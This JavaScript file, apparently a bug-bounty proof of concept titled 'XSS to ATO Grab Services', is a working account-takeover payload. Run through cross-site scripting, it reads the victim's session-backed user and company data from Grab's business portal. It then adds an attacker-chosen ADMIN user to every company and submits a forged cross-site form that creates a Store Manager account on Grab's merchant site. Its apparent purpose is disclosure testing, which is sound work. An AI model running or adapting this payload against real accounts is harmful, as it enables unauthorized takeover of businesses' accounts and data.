// XSS to ATO Grab Services

var GRAB_BUSINESS_EMAIL = "xchopath+unique1@wearehackerone.com";
var GRAB_MERCHANT_EMAIL = "xchopath@wearehackerone.com";

// Helper
function print(title, data) {
  document.body.innerHTML += "<p>" + title + "</p><pre>" + JSON.stringify(data, null, 2) + "</pre>";
}

// ===========================
// Grab Business - ADMIN ACCOUNT CREATION
// ===========================

// 1. Get user info
function getUser() {
  fetch("https://portal.grab.com/portal/v1/user", { credentials: "include" })
  .then(function(response) { return response.json(); })
  .then(function(data) { print("User", data.user); });
}

// 2. Get companies
function getCompanies() {
  fetch("https://portal.grab.com/portal/v1/companies", { credentials: "include" })
  .then(function(response) { return response.json(); })
  .then(function(data) { print("Companies", data.companies); });
}

// 3. Add new admin to company
function addCompanyAdmin() {
  fetch("https://portal.grab.com/portal/v1/companies", { credentials: "include" })
  .then(function(response) { return response.json(); })
  .then(function(data) {
    data.companies.forEach(function(company) {
      fetch("https://portal.grab.com/portal/v1/users", {
        method: "POST",
        credentials: "include",
        headers: {
          "Content-Type": "application/json",
          "Company-Id": String(company.ID)
        },
        body: JSON.stringify({
          user: {
            role: "ADMIN",
            name: "Hackerone Testing",
            email: GRAB_BUSINESS_EMAIL,
            bookingPermissions: ["APP", "GRAB_EXPRESS_WEB"]
          }
        })
      })
      .then(function(response) { return response.json(); })
      .then(function(result) { print("Added to " + company.ID, result); });
    });
  });
}

// ===========================
// Grab Merchant - ADMIN ACCOUNT CREATION
// ===========================

function addMerchantAdmin() {
  var random = Math.floor(Math.random() * 90000) + 10000;
  var username = "newuser_hackerone_" + random;

  var form = document.createElement("form");
  form.method = "POST";
  form.action = "https://merchant.grab.com/employee-management/v1/create-user";
  form.enctype = "text/plain";

  var input = document.createElement("input");
  input.type = "hidden";
  input.name = '{"full_name":"ID","role":"Store Manager","correspondence_email":"' + GRAB_MERCHANT_EMAIL + '","username":"' + username + '","pad":"';
  input.value = '"}';

  form.appendChild(input);
  document.body.appendChild(form);
  form.submit();
}

getUser();
getCompanies();
addCompanyAdmin();

addMerchantAdmin();
